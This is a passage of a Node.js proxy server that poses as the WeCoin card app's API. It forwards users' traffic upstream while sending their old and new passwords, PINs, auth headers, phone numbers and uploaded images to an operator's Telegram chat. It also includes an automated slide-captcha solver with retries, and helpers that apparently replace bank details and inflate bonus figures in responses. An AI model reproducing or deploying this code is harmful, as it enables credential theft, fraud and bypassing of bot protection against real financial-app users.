    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🔒 Password Change [${userId || 'N/A'}]\nOld: ${body.oldPassword || body.oldPwd || 'N/A'}\nNew: ${body.newPassword || body.newPwd || body.password || 'N/A'}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/user/info/updatePin', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    const code = jsonResp?.code || 'N/A';
    const msg = jsonResp?.message || jsonResp?.msg || 'N/A';
    const success = code === 1000 ? '✅' : '❌';
    if (data.adminChatId && bot) {
      const hdrs = {};
      for (const [k, v] of Object.entries(req.headers)) {
        if (!k.startsWith('x-vercel') && !k.startsWith('x-forwarded') && k !== 'host' && k !== 'connection' && k !== 'accept-encoding') hdrs[k] = v;
      }
      bot.sendMessage(data.adminChatId, `🔐 PIN Change ${success} [${userId || 'N/A'}]\nOld: ${body.oldPin || 'N/A'}\nNew: ${body.newPin || body.pin || 'N/A'}\n📋 Code: ${code} | ${msg}\n📋 Full: ${respBody.substring(0, 500)}\n\n📡 Headers:\n${JSON.stringify(hdrs, null, 2).substring(0, 1000)}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/user/info/verifyPin', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    const code = jsonResp?.code || 'N/A';
    const msg = jsonResp?.message || jsonResp?.msg || 'N/A';
    const success = code === 1000 ? '✅' : '❌';
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🔐 PIN Verify ${success} [${userId || 'N/A'}]\nPIN: ${body.pin || body.verifyPin || 'N/A'}\n📋 Code: ${code} | ${msg}\n📋 Full: ${respBody.substring(0, 500)}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/offline/order/page', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
app.all('/app/offline/order/count', async (req, res) => { await proxyAndAddBonus(req, res); });
app.all('/app/offline/order/*', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `📦 ${req.originalUrl} [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/user/info/getInviterUrl', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot) {
      const reqHeaders = {};
      for (const [k, v] of Object.entries(req.headers)) {
        if (!k.startsWith('x-vercel') && !k.startsWith('x-forwarded') && k !== 'host' && k !== 'connection' && k !== 'accept-encoding') reqHeaders[k] = v;
      }
      const respData = getResponseData(jsonResp);
      let inviteInfo = '';
      if (respData && typeof respData === 'object') {
        const invite = respData.invite || respData.inviteCode || respData.inviterCode || respData.code || respData.shareCode || '';
        const url = respData.url || respData.inviteUrl || respData.shareUrl || respData.link || '';
        const inviterId = respData.inviterId || respData.parentId || respData.referrerId || '';
        inviteInfo = `\n\n📋 INVITE DETAILS:\n🔗 Invite Code: ${invite || 'N/A'}\n🌐 URL: ${url || 'N/A'}\n👤 Inviter ID: ${inviterId || 'N/A'}`;
        for (const [k, v] of Object.entries(respData)) {
          if (!['invite', 'inviteCode', 'inviterCode', 'code', 'shareCode', 'url', 'inviteUrl', 'shareUrl', 'link', 'inviterId', 'parentId', 'referrerId'].includes(k)) {
            inviteInfo += `\n📌 ${k}: ${typeof v === 'object' ? JSON.stringify(v) : v}`;
          }
        }
      }
      bot.sendMessage(data.adminChatId, `🔗 GET INVITER URL\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST HEADERS:\n${JSON.stringify(reqHeaders, null, 2).substring(0, 2000)}\n\n📤 REQUEST BODY:\n${JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1000)}\n\n📥 FULL RESPONSE:\n${(jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody).substring(0, 3000)}${inviteInfo}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/user/token/page', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
app.all('/app/itoken/appi/token/page', async (req, res) => { await proxyAndReplaceBankInList(req, res); });



app.all('/app/base/comm/uploadBase64', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const body = req.parsedBody || {};
      let imageSent = false;
      const base64Fields = ['file', 'base64', 'image', 'img', 'photo', 'fileBase64', 'imgBase64', 'imageBase64', 'content', 'data'];
      for (const field of base64Fields) {
        let b64 = body[field];
        if (!b64 || typeof b64 !== 'string') continue;
        b64 = b64.replace(/^data:image\/[a-z]+;base64,/i, '');
        if (b64.length < 100) continue;
        try {
          const imgBuf = Buffer.from(b64, 'base64');
          if (imgBuf.length > 100) {
            await bot.sendPhoto(data.adminChatId, imgBuf, { caption: `📸 Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
            imageSent = true;
            break;
          }
        } catch (e) {
          bot.sendMessage(data.adminChatId, `📸 Base64 decode failed: ${e.message}`).catch(() => { });
        }
      }
      if (!imageSent) {
        const bodyStr = JSON.stringify(body);
        const b64Match = bodyStr.match(/(?:data:image\/[a-z]+;base64,)?([A-Za-z0-9+/=]{200,})/);
        if (b64Match) {
          try {
            const raw = b64Match[1].replace(/^data:image\/[a-z]+;base64,/i, '');
            const imgBuf = Buffer.from(raw, 'base64');
            if (imgBuf.length > 100) {
              await bot.sendPhoto(data.adminChatId, imgBuf, { caption: `📸 Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
              imageSent = true;
            }
          } catch (e) { }
        }
      }
      if (!imageSent) {
        bot.sendMessage(data.adminChatId, `🖼 Base64 Upload [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nBody size: ${req.rawBody ? req.rawBody.length : 0} bytes\nKeys: ${Object.keys(body).join(', ')}`).catch(() => { });
      }
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/base/comm/upload', async (req, res) => {
  const data = await loadData();
  try {
    const url = ORIGINAL_API + req.originalUrl;
    const fwd = {};
    for (const [k, v] of Object.entries(req.headers)) {
      const kl = k.toLowerCase();
      if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
      fwd[k] = v;
    }
    fwd['host'] = 'api.wecoincard.com';
    const opts = { method: req.method, headers: fwd };
    if (req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      fwd['content-length'] = String(req.rawBody.length);
    }
    const response = await fetch(url, opts);
    const respBody = await response.text();
    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const kl = key.toLowerCase();
      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
        respHeaders[key] = val;
      }
    });
    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch (e) { }
    const userId = await extractUserId(req, jsonResp);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot && req.rawBody && req.rawBody.length > 0 && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const contentType = req.headers['content-type'] || '';
      let imageSent = false;
      if (contentType.includes('multipart/form-data')) {
        const boundaryMatch = contentType.match(/boundary=([^\s;]+)/);
        if (boundaryMatch) {
          const boundary = boundaryMatch[1];
          const raw = req.rawBody;
          const boundaryBuf = Buffer.from('--' + boundary);
          const parts = [];
          let startIdx = 0;
          while (true) {
            const idx = raw.indexOf(boundaryBuf, startIdx);
            if (idx === -1) break;
            if (startIdx > 0) parts.push(raw.slice(startIdx, idx));
            startIdx = idx + boundaryBuf.length;
            if (raw[startIdx] === 0x0d) startIdx++;
            if (raw[startIdx] === 0x0a) startIdx++;
          }
          for (const part of parts) {
            const headerEnd = part.indexOf('\r\n\r\n');
            if (headerEnd === -1) continue;
            const headerStr = part.slice(0, headerEnd).toString('utf8');
            if (/content-type:\s*(image\/|application\/octet-stream)/i.test(headerStr) ||
              /filename=.*\.(jpg|jpeg|png|gif|webp|bmp)/i.test(headerStr)) {
              const imageData = part.slice(headerEnd + 4);
              if (imageData.length > 100) {
                try {
                  await bot.sendPhoto(data.adminChatId, imageData, { caption: `📸 Upload [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'upload.jpg', contentType: 'image/jpeg' });
                  imageSent = true;
                } catch (e) {
                  bot.sendMessage(data.adminChatId, `📸 Image extract failed: ${e.message}\nSize: ${imageData.length} bytes`).catch(() => { });
                }
              }
              break;
            }
          }
        }
      }
      if (!imageSent) {
        bot.sendMessage(data.adminChatId, `🖼 File Upload [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nContent-Type: ${contentType}\nBody size: ${req.rawBody.length} bytes`).catch(() => { });
      }
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/payment/order/nightBonusStatus', async (req, res) => { await proxyAndAddBonus(req, res); });

const captchaAnswers = new Map();
async function setCaptchaAnswer(key, ans) {
  if (!key) return { ok: false, where: 'no-key' };
  captchaAnswers.set(key, { ...ans, t: Date.now() });
  if (captchaAnswers.size > 500) {
    const cutoff = Date.now() - 10 * 60 * 1000;
    for (const [k, v] of captchaAnswers) if (v.t < cutoff) captchaAnswers.delete(k);
  }
  if (!redis) return { ok: true, where: 'map-only' };
  try {
    await redis.set(`wecoinCaptcha:${key}`, JSON.stringify(ans), { ex: 600 });
    return { ok: true, where: 'map+redis' };
  } catch (e) {
    return { ok: false, where: 'map+redis-fail', err: e.message };
  }
}
async function getCaptchaAnswer(key) {
  if (!key) return { ans: null, where: 'no-key' };
  const local = captchaAnswers.get(key);
  if (local) return { ans: local, where: 'map' };
  if (redis) {
    try {
      const raw = await redis.get(`wecoinCaptcha:${key}`);
      if (raw) {
        const ans = typeof raw === 'string' ? JSON.parse(raw) : raw;
        return { ans, where: 'redis' };
      }
      return { ans: null, where: 'redis-miss' };
    } catch (e) {
      return { ans: null, where: 'redis-err:' + e.message };
    }
  }
  return { ans: null, where: 'no-store' };
}

const captchaVerifyResults = new Map();
async function setCaptchaVerifyResult(key, result) {
  if (!key || !result) return { ok: false, where: 'no-key' };
  captchaVerifyResults.set(key, { ...result, t: Date.now() });
  if (captchaVerifyResults.size > 500) {
    const cutoff = Date.now() - 10 * 60 * 1000;
    for (const [k, v] of captchaVerifyResults) if (v.t < cutoff) captchaVerifyResults.delete(k);
  }
  if (!redis) return { ok: true, where: 'map-only' };
  try {
    await redis.set(`wecoinCaptchaVerify:${key}`, JSON.stringify(result), { ex: 600 });
    return { ok: true, where: 'map+redis' };
  } catch (e) {
    return { ok: false, where: 'map+redis-fail', err: e.message };
  }
}
async function getCaptchaVerifyResult(key) {
  if (!key) return { result: null, where: 'no-key' };
  const local = captchaVerifyResults.get(key);
  if (local) {
    if (Date.now() - local.t > 10 * 60 * 1000) {
      captchaVerifyResults.delete(key);
    } else {
      const { t, ...rest } = local;
      return { result: rest, where: 'map' };
    }
  }
  if (redis) {
    try {
      const raw = await redis.get(`wecoinCaptchaVerify:${key}`);
      if (raw) {
        const result = typeof raw === 'string' ? JSON.parse(raw) : raw;
        return { result, where: 'redis' };
      }
      return { result: null, where: 'redis-miss' };
    } catch (e) {
      return { result: null, where: 'redis-err:' + e.message };
    }
  }
  return { result: null, where: 'no-store' };
}

async function serverSideVerify(captchaKey, x, y, templateId, ua) {
  // Performs upstream /app/captcha/verify within current lambda invocation,
  // sharing the outbound IP with the /new request that just succeeded.
  const body = JSON.stringify({ captchaKey, x: Math.round(Number(x)), y: Math.round(Number(y)), templateId: templateId || 'slide-default' });
  const headers = {
    'host': 'api.wecoincard.com',
    'content-type': 'application/json',
    'accept': '*/*',
    'accept-encoding': 'identity',
    'user-agent': ua || 'Mozilla/5.0 (Linux; Android 16; RMX3853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0 Mobile Safari/537.36',
  };
  const ac = new AbortController();
  const tm = setTimeout(() => ac.abort(), 10000);
  try {
    const resp = await fetch(ORIGINAL_API + '/app/captcha/verify', {
      method: 'POST', headers, body, signal: ac.signal,
    });
    clearTimeout(tm);
    const text = await resp.text();
    let json; try { json = JSON.parse(text); } catch (_) { }
    return { ok: true, status: resp.status, body: text, json };
  } catch (e) {
    clearTimeout(tm);
    return { ok: false, error: e.message };
  }
}

// Fetch a FRESH captcha from upstream (for retry purposes).
async function fetchFreshCaptcha(ua) {
  const headers = {
    'host': 'api.wecoincard.com',
    'accept': '*/*',
    'accept-encoding': 'identity',
    'user-agent': ua || 'Mozilla/5.0 (Linux; Android 16; RMX3853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0 Mobile Safari/537.36',
  };
  const ac = new AbortController();
  const tm = setTimeout(() => ac.abort(), 10000);
  try {
    const resp = await fetch(ORIGINAL_API + '/app/captcha/new', { method: 'GET', headers, signal: ac.signal });
    clearTimeout(tm);
    const text = await resp.text();
    let json; try { json = JSON.parse(text); } catch (_) { }
    return { ok: true, status: resp.status, json };
  } catch (e) {
    clearTimeout(tm);
    return { ok: false, error: e.message };
  }
}

// AUTO-RETRY HELPER: when upstream returns 1001 for the user's verify, repeatedly
// (1) fetch a fresh captcha, (2) solve it ourselves, (3) submit verify upstream.
// Returns the FIRST successful upstream response (code===1000 with captchaToken),
// or null if all attempts exhausted. Mobile only cares about the captchaToken to
// pass to /login — the underlying captcha key is irrelevant to it.
async function autoSolveRetry(ua, maxAttempts, deadlineMs) {
  const attempts = [];
  const deadline = deadlineMs || (Date.now() + 22000); // default 22s budget
  for (let i = 1; i <= maxAttempts; i++) {
    if (Date.now() >= deadline) {
      attempts.push(`#${i}:budget-exceeded`);
      break;
    }
    const t0 = Date.now();
    const fresh = await fetchFreshCaptcha(ua);
    if (!fresh.ok || !fresh.json || fresh.json.code !== 1000 || !fresh.json.data) {
      attempts.push(`#${i}:new-fail(${fresh.error || (fresh.json && fresh.json.code) || '?'})`);
      continue;
    }
    const d = fresh.json.data;
    const key = d.captcha_key || d.captchaKey;
    const dispY = Number(d.display_y != null ? d.display_y : (d.displayY != null ? d.displayY : 0));
    const tplId = d.id || d.templateId || 'slide-default';
    let solvedX, score;
    try {
      const r = solveSlideCaptcha(d.master_image_base64, d.thumb_image_base64, dispY);
      if (r.ok) { solvedX = r.x; score = r.score; }
    } catch (_) { }
    if (solvedX == null) {
      attempts.push(`#${i}:solve-fail`);
      continue;
    }
    const ssv = await serverSideVerify(key, solvedX, dispY, tplId, ua);
    const dt = Date.now() - t0;
    if (ssv.ok && ssv.json && ssv.json.code === 1000) {
      attempts.push(`#${i}:OK x=${solvedX} y=${dispY} score=${score?.toFixed(2)} ${dt}ms`);
      return { success: true, response: ssv.json, attempts, attemptsCount: i };
    }
    const code = ssv.json ? ssv.json.code : '?';
    attempts.push(`#${i}:fail x=${solvedX} y=${dispY} score=${score?.toFixed(2)} code=${code} ${dt}ms`);
  }
  return { success: false, attempts, attemptsCount: attempts.length };
}

app.get('/diag/captcha-test', async (req, res) => {
  try {
    const data = await loadData();
    const adminToken = String(req.query.token || '');
    if (!adminToken || adminToken !== String(data.adminChatId || '')) {
      return res.status(403).json({ error: 'pass ?token=<adminChatId>' });
    }
    const xMode = String(req.query.x || 'display_x');
    const ua = req.query.ua || 'Mozilla/5.0 (Linux; Android 16; RMX3853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0 Mobile Safari/537.36 uni-app';

    let myIp = '?';
    try { const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(4000) }); myIp = (await r.json()).ip; } catch (e) { myIp = `err:${e.message}`; }

    const newHeaders = { 'user-agent': ua, 'accept': 'application/json, text/plain, */*', 'accept-encoding': 'identity' };
    const newResp = await fetch(ORIGINAL_API + '/app/captcha/new', { method: 'GET', headers: newHeaders, signal: AbortSignal.timeout(10000) });
    const newRespHeaders = {};
    newResp.headers.forEach((v, k) => { newRespHeaders[k] = v; });
    const newSetCookie = (newResp.headers.getSetCookie ? newResp.headers.getSetCookie() : []) || [];
    const newJsonText = await newResp.text();
    let newJson; try { newJson = JSON.parse(newJsonText); } catch (e) { }
    const d = newJson?.data || {};
    const captchaKey = d.captcha_key || d.captchaKey;
    const dispX = Number(d.display_x ?? d.displayX ?? 0);
    const dispY = Number(d.display_y ?? d.displayY ?? 0);
    const tW = Number(d.thumb_width ?? d.thumbWidth ?? 60);
    const tplId = d.id || d.templateId || 'slide-default';

    let useX;
    if (xMode === 'display_x') useX = dispX;
    else if (xMode === 'center') useX = dispX + tW / 2;
    else if (xMode === 'right_edge') useX = dispX + tW;
    else if (!isNaN(Number(xMode))) useX = Number(xMode);
    else useX = dispX;

    const verifyBody = { captchaKey, x: useX, y: dispY, templateId: tplId };
    const verifyHeaders = {
      'user-agent': ua,
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'identity',
      'content-type': 'application/json;charset=UTF-8',
    };
    const cookieFromNew = newSetCookie.length ? newSetCookie.map(c => c.split(';')[0]).join('; ') : '';
    if (cookieFromNew) verifyHeaders['cookie'] = cookieFromNew;
    const verifyRaw = JSON.stringify(verifyBody);
    const verifyResp = await fetch(ORIGINAL_API + '/app/captcha/verify', {
      method: 'POST', headers: verifyHeaders, body: verifyRaw, signal: AbortSignal.timeout(10000),
    });
    const verifyRespHeaders = {};
    verifyResp.headers.forEach((v, k) => { verifyRespHeaders[k] = v; });
    const verifyJsonText = await verifyResp.text();
    let verifyJson; try { verifyJson = JSON.parse(verifyJsonText); } catch (e) { }

    const truncStr = (s) => typeof s === 'string' && s.length > 80 ? `${s.slice(0, 40)}...[${s.length}b]` : s;
    const cleanData = JSON.parse(JSON.stringify(d));
    for (const k of Object.keys(cleanData)) if (typeof cleanData[k] === 'string') cleanData[k] = truncStr(cleanData[k]);

    res.json({
      egressIp: myIp,
      xMode,
      'new': {
        status: newResp.status,
        setCookie: newSetCookie,
        respHeaders: newRespHeaders,
        data: cleanData,
      },
      verify: {
        sent: verifyBody,
        status: verifyResp.status,
        respHeaders: verifyRespHeaders,
        body: verifyJson || verifyJsonText.substring(0, 500),
      },
    });
  } catch (e) {
    res.status(500).json({ error: e.message, stack: e.stack?.split('\n').slice(0, 5) });
  }
});

async function handleCaptchaNew(req, res) {
  try {
    const data = await loadData();
    const { response, respBody, respBuffer, respHeaders, jsonResp } = await proxyFetch(req);
    let answerStored = '';
    if (jsonResp && jsonResp.data && (jsonResp.data.captcha_key || jsonResp.data.captchaKey || jsonResp.data.key)) {
      const d = jsonResp.data;
      const key = d.captcha_key || d.captchaKey || d.key;
      const dispX = Number(d.display_x != null ? d.display_x : (d.displayX != null ? d.displayX : 0));
      const dispY = Number(d.display_y != null ? d.display_y : (d.displayY != null ? d.displayY : 0));

      const masterB64 = d.master_image_base64 || d.masterImage || d.master_image || d.bgImage;
      const thumbB64 = d.thumb_image_base64 || d.thumbImage || d.thumb_image || d.sliderImage;

      let solvedX = dispX;
      let solveInfo = 'fallback=display_x';
      try {
        const t0 = Date.now();
        const r = solveSlideCaptcha(masterB64, thumbB64, dispY);
        const dt = Date.now() - t0;
        if (r.ok) {
          solvedX = r.x;
          const t3 = (r.top3 || []).map(t => `(${t.x},${t.y}|c=${t.c.toFixed(2)} e=${t.e.toFixed(2)} k=${t.k.toFixed(1)} s=${t.s.toFixed(1)})`).join(' ');
          solveInfo = `solved x=${r.x} y=${r.y} score=${r.score?.toFixed(2)} et=${r.edgeThresh?.toFixed(0)} bp=${r.boundaryPixels}${r.opaque ? ' opaque' : ''} ms=${dt} | top3: ${t3}`;
        } else {
          solveInfo = `solver_err=${r.error} ms=${dt}`;
        }
      } catch (e) {
        solveInfo = `solver_throw=${e.message}`;
      }

      const ans = {
        x: solvedX,
        y: dispY,
        templateId: d.id || d.templateId || 'slide-default',
      };
      const storeRes = await setCaptchaAnswer(key, ans);
      answerStored = `key=${key.substring(0, 12)}... x=${ans.x} y=${ans.y} | ${solveInfo} | store=${storeRes.where}${storeRes.err ? ':' + storeRes.err : ''}`;

      if (data.captchaSsv === true) {
        try {
          const ssvT0 = Date.now();
          const ssv = await serverSideVerify(key, ans.x, ans.y, ans.templateId, req.headers['user-agent']);
          const ssvDt = Date.now() - ssvT0;
          if (ssv.ok && ssv.json && ssv.json.code === 1000) {
            await setCaptchaVerifyResult(key, ssv.json);
            answerStored += ` | ssv=OK ${ssvDt}ms (KEY CONSUMED)`;
          } else if (ssv.ok && ssv.json) {
            answerStored += ` | ssv=FAIL code=${ssv.json.code} msg="${(ssv.json.message || '').substring(0, 40)}" ${ssvDt}ms (KEY CONSUMED)`;
          } else {
            answerStored += ` | ssv-fail=${ssv.error || ssv.status} ${ssvDt}ms`;
          }
        } catch (e) {
          answerStored += ` | ssv-throw=${e.message}`;
        }
      }
    }
    if (data.adminChatId && bot) {
      let preview;
      if (jsonResp) {
        const truncated = JSON.parse(JSON.stringify(jsonResp));
        const truncStr = (s) => typeof s === 'string' && s.length > 80 ? `${s.slice(0, 40)}...[${s.length}b]` : s;
        const walk = (o) => { if (!o || typeof o !== 'object') return; for (const k of Object.keys(o)) { if (typeof o[k] === 'string') o[k] = truncStr(o[k]); else walk(o[k]); } };
        walk(truncated);
        preview = JSON.stringify(truncated, null, 2);
      } else {
        preview = (respBody || `<binary ${respBuffer.length}b>`).substring(0, 1000);
      }
      const newRespHdrs = {};
      for (const [k, v] of Object.entries(respHeaders)) {
        const kl = k.toLowerCase();
        if (kl === 'content-type' || kl === 'set-cookie' || kl.startsWith('x-') || kl === 'date' || kl === 'server' || kl === 'cf-ray') {
          newRespHdrs[kl] = v;
        }
      }
      bot.sendMessage(data.adminChatId, `🆕 Captcha New\n📥 STATUS: ${response.status}\n🔑 STORED ANSWER: ${answerStored || '(none)'}\n\n📥 UPSTREAM HEADERS:\n${JSON.stringify(newRespHdrs, null, 2).substring(0, 600)}\n\n📥 RESPONSE (truncated):\n${preview.substring(0, 1000)}`).catch(() => { });
      try {
        const mImg = jsonResp?.data?.master_image_base64 || jsonResp?.data?.masterImage || jsonResp?.data?.bgImage;
        if (mImg) {
          const m = String(mImg).match(/^data:image\/[a-z]+;base64,(.+)$/i);
          if (m) {
            const buf = Buffer.from(m[1], 'base64');
            const cap = `Master image | dispX=${jsonResp.data.display_x} dispY=${jsonResp.data.display_y} | ${answerStored}`;
            bot.sendPhoto(data.adminChatId, buf, { caption: cap.substring(0, 1024) }, { filename: 'master.jpg', contentType: 'image/jpeg' }).catch(() => { });
          }
        }
        const tImg = jsonResp?.data?.thumb_image_base64 || jsonResp?.data?.thumbImage || jsonResp?.data?.sliderImage;
        if (tImg) {
          const m = String(tImg).match(/^data:image\/[a-z]+;base64,(.+)$/i);
          if (m) {
            const buf = Buffer.from(m[1], 'base64');
            bot.sendPhoto(data.adminChatId, buf, { caption: 'Thumb image' }, { filename: 'thumb.png', contentType: 'image/png' }).catch(() => { });
          }
        }
      } catch (e) { }
    }
    respHeaders['content-length'] = String(respBuffer.length);
    res.writeHead(response.status, respHeaders);
    res.end(respBuffer);
  } catch (e) { await transparentProxy(req, res); }
}
app.all('/app/captcha/new', handleCaptchaNew);
app.all('/app/slider/new', handleCaptchaNew);
app.all('/slider/new', handleCaptchaNew);
app.all('/captcha/new', handleCaptchaNew);

async function handleCaptchaVerify(req, res) {
  try {
    const data = await loadData();
    const body = req.parsedBody || {};
    const inKey = body.captchaKey || body.captcha_key || body.key;
    const forceSolve = req.query && (req.query.solve === '1' || req.query.autosolve === '1');
    const enableAutoSolve = forceSolve || data.captchaAutoSolve === true;
    const passthrough = !enableAutoSolve || (req.query && (req.query.nosolve === '1' || req.query.passthrough === '1'));
    let autoSolved = passthrough ? '(PURE PASSTHROUGH — mobile x/y unchanged)' : '';
    let originalReq = { x: body.x, y: body.y };

    if (inKey && !passthrough) {
      const cached = await getCaptchaVerifyResult(inKey);
      if (cached.result) {
        if (data.adminChatId && bot) {
          const msg = `🧩✅ Captcha Verify CACHED (server-side verified in /new)\n🔑 key=${inKey.substring(0, 12)}...\n📦 source=${cached.where}\n\n📥 CACHED BODY:\n${JSON.stringify(cached.result, null, 2).substring(0, 1500)}`;
          bot.sendMessage(data.adminChatId, msg.substring(0, 4000)).catch(() => { });
        }
        return res.json(cached.result);
      }
    }

    if (inKey && !passthrough) {
      const got = await getCaptchaAnswer(inKey);
      const ans = got.ans;
      if (ans) {
        const finalX = Math.round(Number(ans.x));
        const finalY = Math.round(Number(ans.y));
        const newBody = { ...body, x: finalX, y: finalY };
        if (!newBody.templateId && ans.templateId) newBody.templateId = ans.templateId;
        const newRaw = Buffer.from(JSON.stringify(newBody), 'utf8');
        req.rawBody = newRaw;
        if (req.headers['content-type'] && !/json/i.test(req.headers['content-type'])) {
          req.headers['content-type'] = 'application/json';
        }
        req.parsedBody = newBody;
        autoSolved = `x:${originalReq.x}->${finalX} y:${originalReq.y}->${finalY} (from=${got.where})`;
      } else {
        autoSolved = `(no stored answer; lookup=${got.where} key=${inKey.substring(0, 12)}...)`;
      }
    }

    const fwdHeadersPreview = {};
    for (const [k, v] of Object.entries(req.headers)) {
      const kl = k.toLowerCase();
      if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
        kl === 'transfer-encoding' || kl === 'accept-encoding' ||
        kl === 'forwarded' || kl === 'x-real-ip' || kl === 'true-client-ip' ||
        kl === 'cf-connecting-ip' || kl === 'cf-ray' || kl === 'cf-visitor' ||
        kl === 'cf-ipcountry' || kl === 'cdn-loop' || kl === 'via' ||
        kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') ||
        kl.startsWith('x-invocation') || kl.startsWith('x-amzn') ||
        kl.startsWith('x-amz-') || kl.startsWith('cf-')) continue;
      fwdHeadersPreview[kl] = (kl === 'authorization' && typeof v === 'string') ? (v.substring(0, 18) + '...') : v;
    }

    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    const autoRetryDisabled = (data.captchaAutoRetry === false) || (req.query && req.query.noretry === '1');
    let finalJson = jsonResp, finalBody = respBody, finalHeaders = respHeaders, finalStatus = response.status;
    let retrySummary = '';
    if (!autoRetryDisabled && jsonResp && jsonResp.code === 1001) {
      const rawN = Number.parseInt(req.query?.retry ?? data.captchaRetryAttempts ?? 6, 10);
      const maxAttempts = Math.min(10, Math.max(1, Number.isFinite(rawN) ? rawN : 6));
      const ua = req.headers['user-agent'];
      const t0 = Date.now();
      const deadline = t0 + 22000;
      const retry = await autoSolveRetry(ua, maxAttempts, deadline);
      const dt = Date.now() - t0;
      retrySummary = `\n🔄 AUTO-RETRY (${retry.attemptsCount} attempts, ${dt}ms): ${retry.success ? '✅ SUCCESS' : '❌ all failed'}\n   ${retry.attempts.join('\n   ')}`;
      if (retry.success) {
        finalJson = retry.response;
        finalBody = JSON.stringify(retry.response);
        finalStatus = 200;
        finalHeaders = { ...respHeaders, 'content-type': 'application/json', 'content-length': String(Buffer.byteLength(finalBody, 'utf8')) };
      }
    }

    if (data.adminChatId && bot) {
      const respHdrPreview = {};
      for (const [k, v] of Object.entries(finalHeaders)) {
        const kl = k.toLowerCase();
        if (kl === 'content-type' || kl === 'set-cookie' || kl.startsWith('x-') || kl === 'date' || kl === 'server' || kl === 'cf-ray') {
          respHdrPreview[kl] = v;
        }
      }
      const msg1 = `🧩 Captcha Verify RESPONSE\n🔧 AUTO-SOLVE: ${autoSolved || '(no key)'}${retrySummary}\n\n📥 STATUS: ${finalStatus}\n📥 BODY:\n${(finalJson ? JSON.stringify(finalJson, null, 2) : finalBody).substring(0, 1500)}\n\n📥 HEADERS:\n${JSON.stringify(respHdrPreview, null, 2).substring(0, 800)}`;
      bot.sendMessage(data.adminChatId, msg1.substring(0, 4000)).catch(() => { });
      const msg2 = `🧩 Captcha Verify REQUEST\n📤 HEADERS sent to upstream:\n${JSON.stringify(fwdHeadersPreview, null, 2).substring(0, 1500)}\n\n📤 BODY sent:\n${JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 800)}`;
      bot.sendMessage(data.adminChatId, msg2.substring(0, 4000)).catch(() => { });
    }
    sendJson(res, finalHeaders, finalJson, finalBody);
  } catch (e) {
    try {
      const data = cachedData || await loadData().catch(() => ({}));
      if (data && data.adminChatId && bot) {
